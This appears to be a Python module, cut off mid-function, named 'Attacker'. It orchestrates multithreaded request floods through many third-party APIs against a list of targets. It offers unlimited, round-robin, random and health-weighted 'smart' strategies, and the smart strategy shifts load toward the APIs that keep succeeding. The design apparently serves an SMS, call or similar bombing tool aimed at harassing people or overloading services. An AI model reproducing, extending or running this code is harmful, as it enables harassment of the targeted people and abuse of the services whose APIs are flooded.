"""Attacker — orchestrates threads, strategies, health, rate limit."""
from __future__ import annotations

import logging
import random
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Any

from core.apis import expand_api, filter_apis
from core.health import ApiHealthTracker
from core.sender import Sender
from core.stats import Stats


#  Strategy metadata
STRATEGIES: dict[str, dict[str, str]] = {
    "smart": {
        "label": "Smart",
        "summary": "Adaptive, health-weighted, unlimited by default.",
        "details": (
            "Continuously picks APIs weighted by their observed success rate. "
            "Failing APIs drop in priority; cooling APIs are skipped. "
            "Runs without a round cap unless 'rounds' is set > 0."
        ),
    },
    "unlimited": {
        "label": "Unlimited",
        "summary": "Every API, every cycle, forever, until you stop it.",
        "details": (
            "Cycles through every enabled API in round-robin fashion, "
            "with no upper limit on rounds. Ignores the 'rounds' config. "
            "Stop with the space bar or Esc."
        ),
    },
    "round-robin": {
        "label": "Round-Robin",
        "summary": "Classic fixed sequence, configurable rounds.",
        "details": (
            "Walks the API list in order, then repeats. "
            "Runs exactly 'rounds' times. Predictable, good for benchmarking."
        ),
    },
    "random": {
        "label": "Random",
        "summary": "Shuffles the API list every round.",
        "details": (
            "Same as round-robin, but the API list is reshuffled each round. "
            "Runs exactly 'rounds' times. Useful for avoiding trivial patterns."
        ),
    },
}

DEFAULT_STRATEGY = "smart"


#  Rate limiter
class RateLimiter:
    def __init__(self, per_sec: float) -> None:
        self.min_interval = (1.0 / per_sec) if per_sec > 0 else 0.0
        self._lock = threading.Lock()
        self._last = 0.0

    def acquire(self) -> None:
        if self.min_interval <= 0:
            return
        with self._lock:
            now = time.time()
            wait = self._last + self.min_interval - now
            if wait > 0:
                time.sleep(wait)
                now = time.time()
            self._last = now


#  Attacker
class Attacker:
    def __init__(
        self,
        cfg: dict[str, Any],
        apis: list[dict[str, Any]],
        logger: logging.Logger,
    ) -> None:
        self.cfg = cfg
        self.all_apis = apis
        self.logger = logger

        self.apis = filter_apis(
            apis,
            tags=cfg["attack"].get("api_filter_tags") or [],
            enabled_only=bool(cfg["attack"].get("api_filter_enabled_only", True)),
        )

        self.sender = Sender(cfg)
        self.health = (
            ApiHealthTracker(
                cfg["api_health"]["failure_threshold"],
                cfg["api_health"]["cooldown_seconds"],
            )
            if cfg["api_health"]["enabled"] else None
        )
        self.rate = RateLimiter(float(cfg["attack"].get("rate_limit_per_sec", 0)))

        self.stats = Stats()
        self.stop_flag = threading.Event()
        self.round_idx = 0
        self.total_rounds = 0
        self.unlimited = False
        self.current_targets: list[str] = []
        self.strategy = cfg["attack"].get("strategy", DEFAULT_STRATEGY)

        # Per-API success weights (smart strategy)
        self._weights: dict[str, float] = {a.get("name", "?"): 1.0 for a in self.apis}
        self._weights_lock = threading.Lock()


    def dry_run(self, targets: list[str]) -> dict[str, Any]:
        total_jobs = 0
        per_api: dict[str, int] = {}
        for _t in targets:
            for api in self.apis:
                w = max(1, int(api.get("weight", 1)))
                name = api.get("name", "?")
                per_api[name] = per_api.get(name, 0) + w
                total_jobs += w
        rounds = int(self.cfg["attack"]["rounds"])
        unlimited = self.strategy in ("smart", "unlimited") and rounds <= 0
        return {
            "targets": targets,
            "apis": len(self.apis),
            "jobs_per_round": total_jobs,
            "rounds": "unlimited" if unlimited else rounds,
            "total_requests": "unlimited" if unlimited else total_jobs * rounds,
            "threads": int(self.cfg["attack"]["threads"]),
            "rate_limit": float(self.cfg["attack"].get("rate_limit_per_sec", 0)),
            "strategy": self.strategy,
            "per_api": per_api,
        }


    #  Smart strategy: weight per-API by success rate, skip cooling APIs
    def _weighted_pick(self, pool: list[dict[str, Any]]) -> dict[str, Any]:
        with self._weights_lock:
            weights = [self._weights.get(a.get("name", "?"), 1.0) for a in pool]
        total = sum(weights) or 1.0
        r = random.uniform(0, total)
        acc = 0.0
        for api, w in zip(pool, weights):
            acc += w
            if r <= acc:
                return api
        return pool[-1]

    def _bump_weight(self, name: str, ok: bool) -> None:
        with self._weights_lock:
            cur = self._weights.get(name, 1.0)
            if ok:
                self._weights[name] = min(5.0, cur + 0.15)
            else:
                self._weights[name] = max(0.05, cur * 0.65)

    def _eligible(self, api: dict[str, Any]) -> bool:
        if self.health and not self.health.is_available(api):
            return False
        return True

    def _build_jobs(self) -> list[tuple[dict[str, Any], str]]:
        jobs: list[tuple[dict[str, Any], str]] = []
        eligible = [a for a in self.apis if self._eligible(a)]
        if not eligible:
            return jobs

        if self.strategy == "smart":
            # Weighted random per target, single pass per cycle
            for target in self.current_targets:
                for _ in range(max(1, len(eligible))):
                    api = self._weighted_pick(eligible)
                    jobs.append((api, target))
        elif self.strategy == "unlimited":
            for target in self.current_targets:
                for api in eligible:
                    jobs.append((api, target))
        elif self.strategy == "random":
            pool = list(eligible)
            random.shuffle(pool)
            for target in self.current_targets:
                for api in pool:
                    jobs.append((api, target))
        else:  # round-robin
            for target in self.current_targets:
